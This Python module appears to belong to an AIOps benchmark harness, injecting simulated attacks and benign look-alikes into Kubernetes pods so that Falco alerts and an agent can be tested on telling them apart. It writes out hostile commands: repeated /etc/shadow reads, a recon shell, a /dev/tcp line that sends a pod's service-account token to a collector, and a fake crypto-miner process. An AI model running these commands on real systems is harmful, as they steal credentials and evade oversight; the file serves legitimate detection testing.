# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

"""Falco-visible runtime fault injectors.

SecurityMisconfigInjector changes declarative state (OPA's surface). This one produces
runtime *behaviour*: syscall-level events with no spec change and no telemetry symptom,
so a runtime monitor is the only witness.

TWIN DOCTRINE
    A benign twin must fire the SAME Falco rule(s) as its attack. If the rule sets differ
    the agent separates the pair by rule name alone and never has to judge context, which
    is the thing the pair exists to measure. Two exceptions, both deliberate:
      benign_cpu_job          shares a TELEMETRY signature and is Falco-SILENT by design
      benign_secret_read      shares the shell rule; the discriminator is whose credential

ADDING AN INJECTOR
    1. Write the target signature down first: rules that MUST fire, rules that MUST NOT.
    2. inject_<fault_type>() / recover_<fault_type>() — the method name IS the dispatch.
    3. Fire CONTINUOUSLY. Injection happens before session.start() sets the Falco floor,
       so a one-shot alert lands before the agent's window opens and is invisible to it.
       _start_host_loop() re-execs every 8s; rogue_shell uses an in-pod setsid loop.
    4. End with _verify_falco(must_fire) and, where the claim is a negative,
       _verify_falco_silent(must_not_fire). An unverified twin is a mislabelled episode.

    tty=True is required for "Terminal shell in container" (the rule needs proc.tty != 0)
    and kubectl silently drops -t unless stdin is a real PTY.
"""

import json
import os
import pty
import subprocess
import time

from aiopslab.service.kubectl import KubeCtl
from aiopslab.generators.fault.base import FaultInjector

# Embedded in the rogue command so recovery can pkill it.
_ROGUE_MARKER = "cat /etc/shadow"

# On every host-side loop's cmdline, so one pkill pattern stops them all.
_HOST_LOOP_MARKER = "ARRIVE_HOST_LOOP"

_MINER_MARKER = "ARRIVE_MINER_SIM"
_CPU_JOB_MARKER = "ARRIVE_CPU_JOB"

# Written SPLIT ($S+tcp://, S=stratum assigned in the pod) and that is load-bearing.
# The stratum rule matches `proc.cmdline contains "stratum+tcp"` and is tagged `host` too,
# so an unsplit literal fires on the injector's own kubectl and on the launcher shell —
# the harness writing its own fingerprints into the agent's evidence stream. Host alerts
# carry no k8s.pod.name, so verification could pass on them while the in-pod miner failed.
_MINER_POOL_SPLIT = "$S+tcp://pool.arrive-sim.invalid:3333"
_MINER_POOL_URI = "stratum+tcp://pool.arrive-sim.invalid:3333"

# Named by SYMLINKING /bin/sh to this path: Linux sets `comm` from the path handed to
# execve, so proc.name becomes "xmrig" while the inode executed is still the base image's
# shell. A `cp` would give the same name but make the exe an upper-layer file, firing
# "Drop and execute new binary in container" — a signature the twin cannot match.
# Keep under 15 chars: comm truncates at TASK_COMM_LEN-1 and a truncated name matches nothing.
_MINER_EXE = "/tmp/xmrig"
_CPU_JOB_EXE = "/tmp/analytics-job"
_PUPPET_EXE = "/tmp/puppet"

_MINER_RULE_STRATUM = "Detect crypto miners using the Stratum protocol"
# Matches the miner but can never REPORT it: Falco's default `rule_matching: first` reports
# only the first match, and the stratum rule sits earlier in the same file. Kept so the twin
# can assert it stays silent and its absence reads as designed.
_MINER_RULE_KNOWN_BINARY = "Known Cryptominer Process Executed"

# Fired by BOTH exfil halves. A socket-dup detection, not destination-aware, so it cannot
# tell the agent which half it is looking at.
_EXFIL_RULE_REDIRECT = "Redirect STDOUT/STDIN to Network Connection in Container"
# Sink names are load-bearing: the attack's destination is neutral so it never announces
# the verdict; the twin's is the documented-legitimate one.
_EXFIL_ATTACK_SINK = "data-collector"
_EXFIL_TWIN_SINK = "telemetry-collector"
_EXFIL_SINK_PORT = 9000
_EXFIL_SINK_IMAGE = os.getenv("ARRIVE_SINK_IMAGE", "python:3.11-slim")
_EXFIL_SINK_LABEL = "arrive-sink"
# `> /dev/tcp/...` is a bash builtin (sh/dash lack it) and is what performs the socket dup.
_EXFIL_ATTACK_SOURCE = "/var/run/secrets/kubernetes.io/serviceaccount/token"
_EXFIL_TWIN_SOURCE = "/proc/uptime"

FALCO_NAMESPACE = os.getenv("FALCO_NAMESPACE", "falco")
FALCO_SELECTOR = os.getenv("FALCO_SELECTOR", "app.kubernetes.io/name=falco")
# Debugging only. Runs made with verification off must not be used as results.
_VERIFY = os.getenv("ARRIVE_VERIFY_INJECTION", "1") != "0"

# Held open for the process lifetime: closing a master makes the slave return EIO, which
# would kill the loop's kubectl streams. Released by _stop_host_loops().
_PTY_MASTERS: list[int] = []


class FaultVerificationError(RuntimeError):
    """An injector ran but Falco did not observe the behaviour it is defined by.

    Raised rather than warned: the ground truth asserts these rules fired, so continuing
    produces a mislabelled episode that reads as a model failure downstream.
    """


class SecurityRuntimeInjector(FaultInjector):
    def __init__(self, namespace: str):
        super().__init__(namespace)
        self.namespace = namespace
        self.kubectl = KubeCtl()

    def _first_pod(self, service: str) -> str | None:
        """Name of a running pod for `service` (DeathStarBench pods are '<service>-<hash>')."""
        out = self.kubectl.exec_command(
            f"kubectl get pods -n {self.namespace} -o name --field-selector=status.phase=Running"
        )
        for line in out.splitlines():
            name = line.strip().removeprefix("pod/")
            if name.startswith(service):
                return name
        return None

    # ---- shared machinery --------------------------------------------------------------

    def _start_host_loop(self, pod: str, action: str, tty: bool = False):
        """Re-exec `action` in `pod` every 8s from a host-side loop.

        Each cycle is a one-shot `kubectl exec` that exits, so nothing lingers in the pod
        for `ps` to find and only Falco witnesses it. Self-terminating when the pod goes.

        tty=True allocates a real PTY and execs with `-i -t` so the process gets a
        controlling terminal and "Terminal shell in container" can fire. Without a real PTY
        kubectl drops `-t` silently and the rule never fires.

        `timeout 20` bounds each exec: `kubectl exec -i` can block waiting for stdin EOF,
        and --request-timeout does not bound an upgraded stream.
        """
        check = f"kubectl get pod {pod} -n {self.namespace} --request-timeout=5s >/dev/null 2>&1"
        flags = "-i -t " if tty else ""
        act = (
            f"timeout 20 kubectl exec {flags}{pod} -n {self.namespace} "
            f"-- {action} >/dev/null 2>&1"
        )
        script = f": {_HOST_LOOP_MARKER} {pod}; while {check}; do {act}; sleep 8; done"

        stdin = subprocess.DEVNULL
        slave = None
        if tty:
            master, slave = pty.openpty()
            _PTY_MASTERS.append(master)
            stdin = slave

        subprocess.Popen(
            ["sh", "-c", script],
            stdin=stdin,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        if slave is not None:
            os.close(slave)  # the child holds its own copy

    def _stop_host_loops(self):
        """Kill every host-side loop driver. Does NOT interrupt an in-flight cycle.

        pkill matches the driver's own cmdline, not the `kubectl exec` it may currently
        have in flight, so a running cycle finishes (up to ~8s later) before the pod goes
        quiet. Harmless in a real episode's recover-then-teardown flow; it does mean
        back-to-back injections on one pod with no settle gap can bleed one alert into the
        next problem.
        """
        subprocess.run(
            f"pkill -f '{_HOST_LOOP_MARKER}'", shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        while _PTY_MASTERS:
            try:
                os.close(_PTY_MASTERS.pop())
            except OSError:
                pass

    # ---- verification ------------------------------------------------------------------

    def _falco_rules_fired(self, since_seconds: int, pod: str | None = None) -> set[str]:
        """Distinct Falco rule names in the last `since_seconds`, optionally for one pod."""
        try:
            out = subprocess.run(
                ["kubectl", "logs", "-n", FALCO_NAMESPACE, "-l", FALCO_SELECTOR,
                 f"--since={since_seconds}s", "--tail=-1", "--prefix=false"],
                capture_output=True, text=True, timeout=30,
            )
        except subprocess.TimeoutExpired:
            return set()
        rules: set[str] = set()
        for line in out.stdout.splitlines():
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                alert = json.loads(line)
            except json.JSONDecodeError:
                continue
            rule = alert.get("rule")
            if not rule:
                continue
            if pod:
                observed = (alert.get("output_fields") or {}).get("k8s.pod.name")
                # No k8s.pod.name means a HOST event, not this pod's. Several of these
                # rules are tagged `host`, so keeping them would let verification pass on
                # activity that never happened in the container.
                if not observed or pod not in observed:
                    continue
            rules.add(rule)
        return rules

    def _verify_falco(self, expected: list[str], pod: str, attempts: int = 4, delay: int = 8):
        """Block until Falco reports every rule in `expected` for `pod`, else raise."""
        waited = 0
        fired: set[str] = set()
        for _ in range(attempts):
            time.sleep(delay)
            waited += delay
            fired = self._falco_rules_fired(since_seconds=waited + 30, pod=pod)
            missing = [r for r in expected if r not in fired]
            if not missing:
                print(f"[security_runtime] verified Falco rules {expected} on pod {pod}")
                return
        msg = (
            f"[security_runtime] VERIFICATION FAILED for pod {pod}: expected Falco rule(s) "
            f"{missing} did not fire within {waited}s. Observed: {sorted(fired) or 'none'}. "
            "Common causes: Falco not installed/ready; the container lacks /etc/shadow or a shell; "
            "no PTY was allocated (the 'Terminal shell in container' rule needs proc.tty != 0)."
        )
        if _VERIFY:
            raise FaultVerificationError(msg)
        print(f"[warn] {msg} (ARRIVE_VERIFY_INJECTION=0 — continuing with an UNVERIFIED episode)")

    def _verify_falco_silent(self, forbidden: list[str], pod: str, settle: int = 25):
        """Assert NONE of `forbidden` fired for `pod`.

        For a twin whose claim is a negative — benign_cpu_job is supposed to look like the
        miner on telemetry and be silent on Falco. That silence is the discriminator, so it
        is a claim the ground truth makes and therefore one that has to be measured.
        """
        time.sleep(settle)
        fired = self._falco_rules_fired(since_seconds=settle + 30, pod=pod)
        leaked = [r for r in forbidden if r in fired]
        if not leaked:
            print(f"[security_runtime] verified BENIGN twin on pod {pod}: none of {forbidden} fired")
            return
        msg = (
            f"[security_runtime] TWIN VERIFICATION FAILED for pod {pod}: benign activity fired "
            f"{leaked}, which is the attack half's discriminating rule set. The pair no longer "
            "separates attack from look-alike, so this episode would be mislabelled."
        )
        if _VERIFY:
            raise FaultVerificationError(msg)
        print(f"[warn] {msg} (ARRIVE_VERIFY_INJECTION=0 — continuing with an UNVERIFIED episode)")

    def _require_miner_rules_loaded(self):
        """Fail fast if no miner rules are loaded at all.

        They ship in the SANDBOX ruleset and the chart installs falco-rules:5 (stable) only,
        so S7's ordinary failure mode is "the detector was never there" rather than "the
        injection missed". Add the sandbox tier to the Falco install to fix it — that is a
        campaign decision, since it changes the alert surface for every arm.
        """
        try:
            pods = subprocess.run(
                ["kubectl", "get", "pods", "-n", FALCO_NAMESPACE, "-l", FALCO_SELECTOR,
                 "-o", "jsonpath={.items[0].metadata.name}"],
                capture_output=True, text=True, timeout=30,
            ).stdout.strip()
            if not pods:
                print("[security_runtime] could not find a Falco pod — skipping ruleset preflight")
                return
            out = subprocess.run(
                ["kubectl", "exec", "-n", FALCO_NAMESPACE, pods, "-c", "falco", "--",
                 "sh", "-c", "grep -rl 'Stratum protocol' /etc/falco 2>/dev/null"],
                capture_output=True, text=True, timeout=60,
            )
        except (subprocess.TimeoutExpired, OSError) as e:
            print(f"[security_runtime] ruleset preflight inconclusive ({e}) — continuing")
            return
        if out.stdout.strip():
            print(f"[security_runtime] miner ruleset present: {out.stdout.strip().splitlines()}")
            return
        msg = (
            "[security_runtime] S7 PREREQUISITE MISSING: no miner rules are loaded in Falco. "
            f"'{_MINER_RULE_STRATUM}' lives in falco-sandbox_rules.yaml (maturity_sandbox), and "
            "the falco chart installs 'falco-rules:5' (stable) only. Add the sandbox ruleset to "
            "the Falco install — see the S7 section of this module's docstring for the exact "
            "helm flags — or S7 will fire nothing on any arm."
        )
        if _VERIFY:
            raise FaultVerificationError(msg)
        print(f"[warn] {msg} (ARRIVE_VERIFY_INJECTION=0 — continuing with an UNVERIFIED episode)")

    # ---- rogue_shell / transient_read: read /etc/shadow ---------------------------------
    # Both fire "Read sensitive file untrusted" and NOTHING else — no PTY, so no shell rule.
    # They differ only in persistence: rogue_shell leaves a process `ps` can find,
    # transient_read leaves nothing. Neither has a benign twin yet.

    def inject_rogue_shell(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            # setsid: without it the loop dies with the exec session and fires only once.
            inner = (f'setsid sh -c "while true; do {_ROGUE_MARKER} >/dev/null 2>&1; sleep 12; done" '
                     f'</dev/null >/dev/null 2>&1 &')
            cmd = f"kubectl exec {pod} -n {self.namespace} -- sh -c '{inner}'"
            out = self.kubectl.exec_command(cmd)
            print(f"[security_runtime] rogue process reading /etc/shadow in pod {pod} "
                  f"({service}) | ns: {self.namespace} {out.strip()}")
            self._verify_falco(["Read sensitive file untrusted"], pod)

    def recover_rogue_shell(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                continue
            cmd = f"kubectl exec {pod} -n {self.namespace} -- sh -c 'pkill -f \"{_ROGUE_MARKER}\" 2>/dev/null; true'"
            self.kubectl.exec_command(cmd)
            print(f"[security_runtime] killed rogue process in pod {pod} ({service}) | ns: {self.namespace}")
            
    def inject_puppet_read(self, microservices: list[str]):
        "Simulate a puppet agent reading /etc/shadow. The agent is the parent, so the rule fires."
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            action = (
                f"sh -c 'X={_PUPPET_EXE}; ln -sf /bin/sh $X 2>/dev/null; [ -x $X ] || X=/bin/sh; "
                "$X -c \"while read -r _l; do :; done < /etc/shadow\"'"
            )
            self._start_host_loop(pod, action)
            print(f"[security_runtime] BENIGN puppet-agent read of /etc/shadow (proc={_PUPPET_EXE}) "
                f"in pod {pod} ({service}) via host loop | ns: {self.namespace}")
            self._verify_falco(["Read sensitive file untrusted"], pod)
            self._verify_falco_silent(["Terminal shell in container"], pod)
            
    def recover_puppet_read(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")                        

    def inject_transient_read(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(pod, "cat /etc/shadow")
            print(f"[security_runtime] MALICIOUS transient /etc/shadow reads against pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            self._verify_falco(["Read sensitive file untrusted"], pod)

    def recover_transient_read(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    # ---- attacker_shell + its two twins: TTY shell --------------------------------------
    # attacker_shell fires BOTH rules; both twins fire the shell rule ONLY. The absent
    # sensitive-file alert is the discriminator, so the pair is separable by rule set —
    # deliberately, since that is what S3's contrast class is meant to surface.
    _ATTACKER_SHELL_RULES = ["Terminal shell in container", "Read sensitive file untrusted"]
    _BENIGN_SHELL_RULES = ["Terminal shell in container"]

    def inject_attacker_shell(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            # `sh -c` keeps the spawned process a shell_binary with runc as its parent,
            # which is what "Terminal shell in container" matches on.
            self._start_host_loop(
                pod,
                "sh -c 'id; hostname; cat /etc/shadow; ls -la /var/run/secrets/kubernetes.io/serviceaccount'",
                tty=True,
            )
            print(f"[security_runtime] ATTACKER interactive shell (recon + /etc/shadow) on pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            self._verify_falco(self._ATTACKER_SHELL_RULES, pod)

    def recover_attacker_shell(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    def inject_benign_admin_shell(self, microservices: list[str]):
        """Operator debug session: harmless diagnostics, touches no sensitive file."""
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                "sh -c 'id; uname -a; ls -la /tmp; cat /etc/os-release; df -h'",
                tty=True,
            )
            print(f"[security_runtime] BENIGN admin debug shell (diagnostics) on pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            self._verify_falco(self._BENIGN_SHELL_RULES, pod)

    def recover_benign_admin_shell(self, microservices: list[str] = None):
        self._stop_host_loops()

    def inject_benign_secret_read(self, microservices: list[str]):
        """Workload reading its OWN mounted SA token — the harder twin.

        The token path is not in Falco's `sensitive_files`, so the read fires no rule of its
        own; the TTY shell is what fires the shared rule. Both halves of this pair therefore
        show "shell + credential access" and the discriminator is WHOSE credential.
        """
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                "sh -c 'id; cat /var/run/secrets/kubernetes.io/serviceaccount/token; "
                "ls -la /var/run/secrets/kubernetes.io/serviceaccount'",
                tty=True,
            )
            print(f"[security_runtime] BENIGN own-SA-token read (interactive session) on pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            self._verify_falco(self._BENIGN_SHELL_RULES, pod)

    def recover_benign_secret_read(self, microservices: list[str] = None):
        self._stop_host_loops()

    # ---- crypto_miner + benign_cpu_job: the TWO-SURFACE pair ----------------------------
    # The only pair here that is not Falco-matched. Falco sees a miner and calls it an
    # intrusion; telemetry sees one pegged core and calls it a hot workload. Those support
    # different conclusions, and that divergence is the experiment. The twin is Falco-SILENT
    # by design, so its verification is the negative one.
    _CPU_CYCLE_SECONDS = 7   # of each ~8s cadence; the rest is exec + loop overhead
    _MINER_RULES = [_MINER_RULE_STRATUM]
    _MINER_RULES_SHADOWED = [_MINER_RULE_KNOWN_BINARY]

    def _cpu_loop_action(self, exe: str, marker: str, payload: str, prelude: str = "") -> str:
        """Build a fresh, time-bounded busy loop for one _start_host_loop cycle.

        `ln -sf /bin/sh $X` names the process (see _MINER_EXE). `nice -n 19` keeps the app's
        own threads winning every scheduling contest, so this reads as CPU utilisation and
        never pushes latency into readiness-probe territory — a failing probe would put a
        second telemetry symptom on the board and this pair depends on there being one.
        `prelude` runs before the exec so $VAR references in `payload` expand into the
        miner's own argv rather than staying literal.

        The bound is `sleep N & W=$!; while kill -0 $W; do :; done`. An earlier version used
        `while [ $(date +%s) ... ]`, which forked an external binary every iteration: the
        loop measured ~12% of a core instead of ~100%, and _verify_falco cannot catch that
        because Falco fired exactly as designed. `kill -0` is a builtin, so the loop is
        genuinely CPU-bound (~99.7%); `sleep` forks once per cycle, not once per iteration.

        Every `$` meant for $X's OWN interpreter is escaped as `\\$`: the enclosing string is
        double-quoted in the pod-side shell that builds the argv, and an unescaped `$!`/`$W`
        there expands to empty silently, handing $X a broken script instead of erroring.
        """
        return (
            f"sh -c 'X={exe}; ln -sf /bin/sh $X 2>/dev/null; [ -x $X ] || X=/bin/sh; "
            "N=; command -v nice >/dev/null 2>&1 && N=\"nice -n 19\"; "
            f"{prelude}"
            f"$N $X -c \"{marker}=1; {payload}; "
            f"sleep {self._CPU_CYCLE_SECONDS} & W=\\$!; while kill -0 \\$W 2>/dev/null; "
            "do :; done\"'"
        )

    def inject_crypto_miner(self, microservices: list[str]):
        """Simulated miner: proc named xmrig, a stratum URI in argv, one core of load.

        No mining software runs and no pool is contacted — the pool is an unresolvable
        .invalid name that exists only to be read by Falco's cmdline match.
        """
        self._require_miner_rules_loaded()
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            action = self._cpu_loop_action(
                _MINER_EXE, _MINER_MARKER,
                f"POOL={_MINER_POOL_SPLIT}; WORKER=arrive-sim",
                prelude="S=stratum; ",
            )
            self._start_host_loop(pod, action)
            print(f"[security_runtime] CRYPTO-MINER simulator (proc={_MINER_EXE}, "
                  f"pool={_MINER_POOL_URI}, 1 core, re-exec every 8s) in pod {pod} ({service}) "
                  f"| ns: {self.namespace}")
            self._verify_falco(self._MINER_RULES, pod)

    def recover_crypto_miner(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    def inject_benign_cpu_job(self, microservices: list[str]):
        """Legitimate batch analytics job: same mechanism and CPU shape, no miner strings."""
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            # A process name on neither `miner_binaries` nor `shell_binaries` — the latter
            # so it cannot pick up a shell rule the attack half lacks.
            action = self._cpu_loop_action(
                _CPU_JOB_EXE, _CPU_JOB_MARKER,
                "JOB=nightly-rollup; LEVEL=9; OUT=/tmp/rollup.gz",
            )
            self._start_host_loop(pod, action)
            print(f"[security_runtime] BENIGN CPU-heavy batch job (proc={_CPU_JOB_EXE}, 1 core, "
                  f"re-exec every 8s) in pod {pod} ({service}) | ns: {self.namespace}")
            self._verify_falco_silent(
                self._MINER_RULES + self._MINER_RULES_SHADOWED, pod)

    def recover_benign_cpu_job(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    # ---- exfil_egress + benign_telemetry_egress: same rule, differ in SOURCE ------------
    # The only pair whose two halves are indistinguishable by rule set. The rule keys on the
    # socket-dup and ignores the destination, so it fires identically for both and cannot
    # tell the agent which is which. The discriminator is proc.cmdline (what was read) and
    # the destination Service.
    #
    # Both sinks are deployed by BOTH halves so cluster state is identical across the pair
    # and the only variable is the loop's action.

    def _sink_listener_src(self) -> str:
        return (
            "import socket\n"
            "s=socket.socket()\n"
            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
            f"s.bind((\"0.0.0.0\",{_EXFIL_SINK_PORT}))\n"
            "s.listen(64)\n"
            "while True:\n"
            "    c,a=s.accept()\n"
            "    try:\n"
            "        while c.recv(65536):\n"
            "            pass\n"
            "    except OSError:\n"
            "        pass\n"
            "    c.close()\n"
        )

    def _sink_objects(self, name: str) -> list[dict]:
        labels = {"app": name, _EXFIL_SINK_LABEL: "true"}
        pod = {
            "apiVersion": "v1", "kind": "Pod",
            "metadata": {"name": name, "namespace": self.namespace, "labels": labels},
            "spec": {
                # No SA token: the sink has no reason for one, and it trims one class of the
                # sink's own startup noise.
                "automountServiceAccountToken": False,
                "containers": [{
                    "name": "sink",
                    "image": _EXFIL_SINK_IMAGE,
                    "command": ["python3", "-c", self._sink_listener_src()],
                    "ports": [{"containerPort": _EXFIL_SINK_PORT}],
                }],
            },
        }
        svc = {
            "apiVersion": "v1", "kind": "Service",
            "metadata": {"name": name, "namespace": self.namespace,
                         "labels": {_EXFIL_SINK_LABEL: "true"}},
            "spec": {"selector": {"app": name},
                     "ports": [{"port": _EXFIL_SINK_PORT, "targetPort": _EXFIL_SINK_PORT}]},
        }
        return [pod, svc]

    def _ensure_sinks(self):
        """Deploy both collectors (idempotent) and block until Ready.

        The loop's `> /dev/tcp/...` only dups the socket if connect succeeds, so the rule
        cannot fire — and _verify_falco would wrongly raise — unless the sink is accepting.
        """
        manifest = json.dumps({
            "apiVersion": "v1", "kind": "List",
            "items": self._sink_objects(_EXFIL_ATTACK_SINK) + self._sink_objects(_EXFIL_TWIN_SINK),
        })
        # Piped via STDIN, not `echo '<json>'`: dash-echo would expand the python source's
        # \n escapes and YAML line-folding would then flatten it into one broken line.
        self.kubectl.exec_command("kubectl apply -f -", input_data=manifest)
        for name in (_EXFIL_ATTACK_SINK, _EXFIL_TWIN_SINK):
            self.kubectl.exec_command(
                f"kubectl wait --for=condition=Ready pod -l app={name} "
                f"-n {self.namespace} --timeout=120s"
            )
        print(f"[security_runtime] exfil sinks ready: {_EXFIL_ATTACK_SINK}, {_EXFIL_TWIN_SINK} "
              f"| ns: {self.namespace}")

    def _delete_sinks(self):
        self.kubectl.exec_command(
            f"kubectl delete pod,svc -l {_EXFIL_SINK_LABEL}=true "
            f"-n {self.namespace} --ignore-not-found"
        )

    def inject_exfil_egress(self, microservices: list[str]):
        """Ship a real credential (the mounted SA token) to the unlisted collector.

        The SA token is not in Falco's sensitive_files, so this fires the redirect rule and
        nothing else — kept single-signature so the pair stays matched.
        """
        self._ensure_sinks()
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                f"bash -c 'cat {_EXFIL_ATTACK_SOURCE} > /dev/tcp/{_EXFIL_ATTACK_SINK}/{_EXFIL_SINK_PORT}'",
            )
            print(f"[security_runtime] DATA EXFIL: SA token -> {_EXFIL_ATTACK_SINK}:{_EXFIL_SINK_PORT} "
                  f"from pod {pod} ({service}) via host loop | ns: {self.namespace}")
            self._verify_falco([_EXFIL_RULE_REDIRECT], pod)

    def recover_exfil_egress(self, microservices: list[str] = None):
        self._stop_host_loops()
        self._delete_sinks()
        print(f"[security_runtime] stopped exfil loop [{_HOST_LOOP_MARKER}] and removed sinks "
              f"| ns: {self.namespace}")

    def inject_benign_telemetry_egress(self, microservices: list[str]):
        """Ship innocuous uptime telemetry to the documented collector. Same rule as the attack."""
        self._ensure_sinks()
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                f"bash -c 'cat {_EXFIL_TWIN_SOURCE} > /dev/tcp/{_EXFIL_TWIN_SINK}/{_EXFIL_SINK_PORT}'",
            )
            print(f"[security_runtime] BENIGN telemetry egress: uptime -> {_EXFIL_TWIN_SINK}:{_EXFIL_SINK_PORT} "
                  f"from pod {pod} ({service}) via host loop | ns: {self.namespace}")
            self._verify_falco([_EXFIL_RULE_REDIRECT], pod)

    def recover_benign_telemetry_egress(self, microservices: list[str] = None):
        self._stop_host_loops()
        self._delete_sinks()


if __name__ == "__main__":
    # Smoke-test one injector against a live cluster. Every inject_* verifies itself and
    # raises on failure, so a clean exit IS the verification.
    #
    #   python -m aiopslab.generators.fault.security_runtime [FAULT] [NAMESPACE] [SERVICE]
    #
    # Run a pair BOTH ways: the attack must fire its rules and the twin must fire exactly
    # the shared ones (or none, for benign_cpu_job). Only the second is a claim you can get
    # wrong without noticing.
    import sys

    fault = sys.argv[1] if len(sys.argv) > 1 else "rogue_shell"
    namespace = sys.argv[2] if len(sys.argv) > 2 else "test-social-network"
    service = sys.argv[3] if len(sys.argv) > 3 else "user-service"

    injector = SecurityRuntimeInjector(namespace)
    injector._inject(fault_type=fault, microservices=[service])
    print(f"[smoke] {fault} injected and verified in {namespace}/{service}")
    input("[smoke] press enter to recover... ")
    injector._recover(fault_type=fault, microservices=[service])
